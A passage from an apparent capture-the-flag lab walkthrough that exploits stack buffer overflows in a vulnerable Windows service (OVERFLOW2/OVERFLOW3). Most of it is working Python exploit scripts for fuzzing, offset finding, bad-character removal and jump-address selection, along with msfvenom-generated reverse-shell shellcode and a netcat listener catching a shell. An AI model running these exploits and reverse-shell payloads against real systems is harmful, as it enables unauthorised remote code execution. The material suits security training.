payload += b"\xa4\xdc\x54\x6a\xc5\xb6\xa4\x93\x10\x18\xf4"
payload += b"\x3b\xcb\xd9\xa4\xfb\xbb\xb1\xae\xf3\xe4\xa2"
payload += b"\xd1\xd9\x8c\x49\x28\x8a\xb8\x8d\x32\x4c\xd5"
payload += b"\x8f\x32\x51\x9e\x19\xd4\x3b\xf0\x4f\x4f\xd4"
payload += b"\x69\xca\x1b\x45\x75\xc0\x66\x45\xfd\xe7\x97"
payload += b"\x08\xf6\x82\x8b\xfd\xf6\xd8\xf1\xa8\x09\xf7"
payload += b"\x9d\x37\x9b\x9c\x5d\x31\x80\x0a\x0a\x16\x76"
payload += b"\x43\xde\x8a\x21\xfd\xfc\x56\xb7\xc6\x44\x8d"
payload += b"\x04\xc8\x45\x40\x30\xee\x55\x9c\xb9\xaa\x01"
payload += b"\x70\xec\x64\xff\x36\x46\xc7\xa9\xe0\x35\x81"
payload += b"\x3d\x74\x76\x12\x3b\x79\x53\xe4\xa3\xc8\x0a"
payload += b"\xb1\xdc\xe5\xda\x35\xa5\x1b\x7b\xb9\x7c\x98"
payload += b"\x9b\x58\x54\xd5\x33\xc5\x3d\x54\x5e\xf6\xe8"
payload += b"\x9b\x67\x75\x18\x64\x9c\x65\x69\x61\xd8\x21"
payload += b"\x82\x1b\x71\xc4\xa4\x88\x72\xcd\xa4\x2e\x8d"
payload += b"\xee" 
```
{% endraw %}

<br />
Update the code to include the msfvenom payload.

{% raw %}
```python
import socket
from struct import pack

url = '10.0.0.7'
port = 1337

# baddies = \x00\x23\x3c\x83\xba

payload =  b""
payload += b"\xfc\xbb\x2e\xf7\x96\x80\xeb\x0c\x5e\x56\x31"
payload += b"\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef"
payload += b"\xff\xff\xff\xd2\x1f\x14\x80\x2a\xe0\x79\x08"
payload += b"\xcf\xd1\xb9\x6e\x84\x42\x0a\xe4\xc8\x6e\xe1"
payload += b"\xa8\xf8\xe5\x87\x64\x0f\x4d\x2d\x53\x3e\x4e"
payload += b"\x1e\xa7\x21\xcc\x5d\xf4\x81\xed\xad\x09\xc0"
payload += b"\x2a\xd3\xe0\x90\xe3\x9f\x57\x04\x87\xea\x6b"
payload += b"\xaf\xdb\xfb\xeb\x4c\xab\xfa\xda\xc3\xa7\xa4"
payload += b"\xfc\xe2\x64\xdd\xb4\xfc\x69\xd8\x0f\x77\x59"
payload += b"\x96\x91\x51\x93\x57\x3d\x9c\x1b\xaa\x3f\xd9"
payload += b"\x9c\x55\x4a\x13\xdf\xe8\x4d\xe0\x9d\x36\xdb"
payload += b"\xf2\x06\xbc\x7b\xde\xb7\x11\x1d\x95\xb4\xde"
payload += b"\x69\xf1\xd8\xe1\xbe\x8a\xe5\x6a\x41\x5c\x6c"
payload += b"\x28\x66\x78\x34\xea\x07\xd9\x90\x5d\x37\x39"
payload += b"\x7b\x01\x9d\x32\x96\x56\xac\x19\xff\x9b\x9d"
payload += b"\xa1\xff\xb3\x96\xd2\xcd\x1c\x0d\x7c\x7e\xd4"
payload += b"\x8b\x7b\x81\xcf\x6c\x13\x7c\xf0\x8c\x3a\xbb"
payload += b"\xa4\xdc\x54\x6a\xc5\xb6\xa4\x93\x10\x18\xf4"
payload += b"\x3b\xcb\xd9\xa4\xfb\xbb\xb1\xae\xf3\xe4\xa2"
payload += b"\xd1\xd9\x8c\x49\x28\x8a\xb8\x8d\x32\x4c\xd5"
payload += b"\x8f\x32\x51\x9e\x19\xd4\x3b\xf0\x4f\x4f\xd4"
payload += b"\x69\xca\x1b\x45\x75\xc0\x66\x45\xfd\xe7\x97"
payload += b"\x08\xf6\x82\x8b\xfd\xf6\xd8\xf1\xa8\x09\xf7"
payload += b"\x9d\x37\x9b\x9c\x5d\x31\x80\x0a\x0a\x16\x76"
payload += b"\x43\xde\x8a\x21\xfd\xfc\x56\xb7\xc6\x44\x8d"
payload += b"\x04\xc8\x45\x40\x30\xee\x55\x9c\xb9\xaa\x01"
payload += b"\x70\xec\x64\xff\x36\x46\xc7\xa9\xe0\x35\x81"
payload += b"\x3d\x74\x76\x12\x3b\x79\x53\xe4\xa3\xc8\x0a"
payload += b"\xb1\xdc\xe5\xda\x35\xa5\x1b\x7b\xb9\x7c\x98"
payload += b"\x9b\x58\x54\xd5\x33\xc5\x3d\x54\x5e\xf6\xe8"
payload += b"\x9b\x67\x75\x18\x64\x9c\x65\x69\x61\xd8\x21"
payload += b"\x82\x1b\x71\xc4\xa4\x88\x72\xcd\xa4\x2e\x8d"
payload += b"\xee"

inputBuffer = b'A' * 634
inputBuffer += pack('<L',(0x625011af))
inputBuffer += b'\x90' * 16
inputBuffer += payload
inputBuffer += b'C' * (1100 - len(inputBuffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
s.recv(1024)

print('[*] Sending: {size}'.format(size=len(inputBuffer)))
s.sendall(b'OVERFLOW2 ' + inputBuffer + b'\r\n')

s.close()
```
{% endraw %}

<br />
Start a netcat listener.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW2]
└─$ sudo nc -nlvp 443                         
[sudo] password for kali: 
listening on [any] 443 ...
```
{% endraw %}

<br />
Run the code and catch the shell.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW2]
└─$ sudo nc -nlvp 443                         
[sudo] password for kali: 
listening on [any] 443 ...
connect to [10.0.0.6] from (UNKNOWN) [10.0.0.7] 56186
Microsoft Windows [Version 10.0.19045.3803]
(c) Microsoft Corporation. All rights reserved.

C:\Program Files\Windows Kits\10\Debuggers>
```
{% endraw %}

<br />
<b><u>OVERFLOW3<br /></u></b>

Create a script that connects to the service and sends the OVERFLOW3 command mimicking normal usage.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
print(s.recv(1024))

s.send(b'OVERFLOW3 aaaa\r\n')
print(s.recv(1024))

s.close() 
```
{% endraw %}

<br />
Update the code to fuzz the command with increasing length to find the breakpoint.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

buffers = [b'A']
counter = 100
while len(buffers) < 30:
    buffers.append(b'A' * counter)
    counter += 100

for inputBuffer in buffers:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((url,port))
    s.recv(1024)

    print('[*] Sending: {size}'.format(size=len(inputBuffer)))
    s.send(b'OVERFLOW3 ' + inputBuffer + b'\r\n')
    s.recv(1024)

    s.close() 
```
{% endraw %}

<br />
Run the code and observe the breakpoint.

{% raw %}
```python
= RESTART: /home/kali/Documents/thm/bufferoverflowprep/OVERFLOW3/thm-overflow3_0x01.py
[*] Sending: 1
[*] Sending: 100
[*] Sending: 200
[*] Sending: 300
[*] Sending: 400
[*] Sending: 500
[*] Sending: 600
[*] Sending: 700
[*] Sending: 800
[*] Sending: 900
[*] Sending: 1000
[*] Sending: 1100
[*] Sending: 1200
[*] Sending: 1300 
```
{% endraw %}

<br />
Check the EIP to ensure that we have control of EIP.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of3/firsteip.png" title="First EIP" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Update the code to hardcode the breakpoint in the attack string and 400 to make room for the payload.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

inputBuffer = b'A' * 2100

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
s.recv(1024)

print('[*] Sending: {size}'.format(size=len(inputBuffer)))
s.sendall(b'OVERFLOW3 ' + inputBuffer + b'\r\n')

s.close() 
```
{% endraw %}

<br />
Run the code and check EIP to ensure that we still have control.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of3/seceip.png" title="Second EIP" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Use msf-pattern_create to generate a string to help dertermine the EIP offfset.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW3]
└─$ msf-pattern_create -l 2100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9 
```
{% endraw %}

<br />
Update the code to include the string that was just generated.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

# inputBuffer = b'A' * 2100
inputBuffer = b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
s.recv(1024)

print('[*] Sending: {size}'.format(size=len(inputBuffer)))
s.sendall(b'OVERFLOW3 ' + inputBuffer + b'\r\n')

s.close() 
```
{% endraw %}

<br />
Run the code and check EIP to see the string in the register.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of3/thirdeip.png" title="Third EIP" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Run the string from the regster through msf-pattern_offset to get the exact offset.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW3]
└─$ msf-pattern_offset -l 2100 -q 35714234
[*] Exact match at offset 1274 
```
{% endraw %}

<br />
Update the code to include the offset value that we just calculated.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

inputBuffer = b'A' * 1274
inputBuffer += b'B' * 4
inputBuffer += b'C' * (2100 - len(inputBuffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
s.recv(1024)

print('[*] Sending: {size}'.format(size=len(inputBuffer)))
s.sendall(b'OVERFLOW3 ' + inputBuffer + b'\r\n')

s.close() 
```
{% endraw %}

<br />
Run the script again and check the EIP value for our 42s to ensure that we successfully generated the offset.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of3/42eip.png" title="EIP 42s" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Update the code with a list of all the badchars wo we can test them.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

badchars = (
  b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

inputBuffer = b'A' * 1274
inputBuffer += b'B' * 4
inputBuffer += badchars
inputBuffer += b'C' * (2100 - len(inputBuffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
s.recv(1024)

print('[*] Sending: {size}'.format(size=len(inputBuffer)))
s.sendall(b'OVERFLOW3 ' + inputBuffer + b'\r\n')

s.close() 
```
{% endraw %}

<br />
Check the ESP register to view the baschars and find any mangles.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of3/firstesp.png" title="First ESP" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Notice the \x11 get mangled in ESP.  Remove it from the badchars list and rerun the code.  Check ESP after everytime.  Repeat this until there is no more mangle.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

# baddies = \x00\x11\x40\x5f\xb8\xee

badchars = (
  b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  b"\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
  b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x60"
  b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xef\xf0"
  b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

inputBuffer = b'A' * 1274
inputBuffer += b'B' * 4
inputBuffer += badchars
inputBuffer += b'C' * (2100 - len(inputBuffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
s.recv(1024)

print('[*] Sending: {size}'.format(size=len(inputBuffer)))
s.sendall(b'OVERFLOW3 ' + inputBuffer + b'\r\n')

s.close() 
```
{% endraw %}

<br />
Update the code to remove the badchars and leave a payload stub.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

# baddies = \x00\x11\x40\x5f\xb8\xee

payload = b'D' * 400

inputBuffer = b'A' * 1274
inputBuffer += b'B' * 4
inputBuffer += payload
inputBuffer += b'C' * (2100 - len(inputBuffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
s.recv(1024)

print('[*] Sending: {size}'.format(size=len(inputBuffer)))
s.sendall(b'OVERFLOW3 ' + inputBuffer + b'\r\n')

s.close() 
```
{% endraw %}

<br />
Load the narly extension in WinDBG.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of3/narly.png" title="Load Narly" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Run nmod to get a list of modules and their security to find the appropriate module.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of3/findaddy.png" title="Find address" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Update the code with the address that was discovered in the essfunc.dll.

{% raw %}
```python
import socket
from struct import pack

url = '10.0.0.7'
port = 1337

# baddies = \x00\x11\x40\x5f\xb8\xee

payload = b'D' * 400

inputBuffer = b'A' * 1274
inputBuffer += pack('<L',(0x62501203))
inputBuffer += payload
inputBuffer += b'C' * (2100 - len(inputBuffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
s.recv(1024)

print('[*] Sending: {size}'.format(size=len(inputBuffer)))
s.sendall(b'OVERFLOW3 ' + inputBuffer + b'\r\n')

s.close() 
```
{% endraw %}

<br />
Update the code with a nop sled.

{% raw %}
```python
import socket
from struct import pack

url = '10.0.0.7'
port = 1337

# baddies = \x00\x11\x40\x5f\xb8\xee

payload = b'D' * 400

inputBuffer = b'A' * 1274
inputBuffer += pack('<L',(0x62501203))
inputBuffer += b'\x90' * 16
inputBuffer += payload
inputBuffer += b'C' * (2100 - len(inputBuffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
s.recv(1024)

print('[*] Sending: {size}'.format(size=len(inputBuffer)))
s.sendall(b'OVERFLOW3 ' + inputBuffer + b'\r\n')

s.close() 
```
{% endraw %}

<br />
Use msfvenom to generate the paylaod.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW3]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.6 LPORT=443 ExitFunc=thread -f python -v payload -b "\x00\x11\x40\x5f\xb8\xee"
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor failed with Encoding failed due to a bad character (index=20, char=0xee)
Attempting to encode payload with 1 iterations of x86/countdown
x86/countdown failed with Encoding failed due to a bad character (index=275, char=0x11)
Attempting to encode payload with 1 iterations of x86/fnstenv_mov
x86/fnstenv_mov failed with Encoding failed due to a bad character (index=4, char=0xee)
Attempting to encode payload with 1 iterations of x86/jmp_call_additive
x86/jmp_call_additive succeeded with size 353 (iteration=0)
x86/jmp_call_additive chosen with final size 353
Payload size: 353 bytes
Final size of python file: 1922 bytes
payload =  b""
payload += b"\xfc\xbb\x2e\x66\xb6\xa7\xeb\x0c\x5e\x56\x31"
payload += b"\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef"
payload += b"\xff\xff\xff\xd2\x8e\x34\xa7\x2a\x4f\x59\x21"
payload += b"\xcf\x7e\x59\x55\x84\xd1\x69\x1d\xc8\xdd\x02"
payload += b"\x73\xf8\x56\x66\x5c\x0f\xde\xcd\xba\x3e\xdf"
